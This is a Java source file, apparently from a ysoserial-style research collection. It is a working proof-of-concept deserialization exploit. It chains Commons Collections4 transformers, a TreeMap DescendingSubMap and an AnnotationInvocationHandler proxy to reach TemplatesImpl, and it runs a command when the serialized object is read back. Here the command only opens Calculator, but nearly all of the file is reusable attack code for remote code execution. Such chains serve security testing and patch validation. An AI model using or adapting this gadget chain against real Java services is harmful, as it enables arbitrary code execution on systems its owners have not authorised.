package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.TreeMap;

/**
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * getEntryUsingComparator:376, TreeMap (java.util)
 * getEntry:345, TreeMap (java.util)
 * get:278, TreeMap (java.util)
 * get:1517, TreeMap$NavigableSubMap (java.util)
 * invoke:77, AnnotationInvocationHandler (sun.reflect.annotation)
 * entrySet:-1, $Proxy1 (com.sun.proxy)
 * readObject:444, AnnotationInvocationHandler (sun.reflect.annotation)

 */



public class CC4_Poc6 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

        ConstantTransformer constant = new ConstantTransformer(String.class);

        Class[] paramTypes = new Class[] { String.class };
        Object[] arg = new Object[] { "foo" };

        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, arg);


        Transformer[] transformers = new Transformer[]{
                constant, instantiate
        };



        TreeMap treeMap = new TreeMap(new TransformingComparator(new ChainedTransformer(transformers)));

        treeMap.put("ss","aa");
        // AscendingSubMap DescendingSubMapTreeMap$AscendingSubMap
        Class clazz2 = Class.forName("java.util.TreeMap$DescendingSubMap");
        Constructor bindingEnumerationConstructor = clazz2.getDeclaredConstructor(TreeMap.class, boolean.class,Object.class,boolean.class,boolean.class,Object.class,boolean.class);
        bindingEnumerationConstructor.setAccessible(true);
        Object bindingEnumerationObject = bindingEnumerationConstructor.newInstance(treeMap, true,null,true,true,null,true);




        Reflections.setDeclaredField(constant, "iConstant", TrAXFilter.class);
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        arg = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
        paramTypes[0] = Templates.class;
        arg[0] = templates;


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,bindingEnumerationObject);
        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class,mapProxy);



        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
        outputStream.writeObject(handler);
        outputStream.close();


        //         deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
        inputStream.readObject();
    }
}
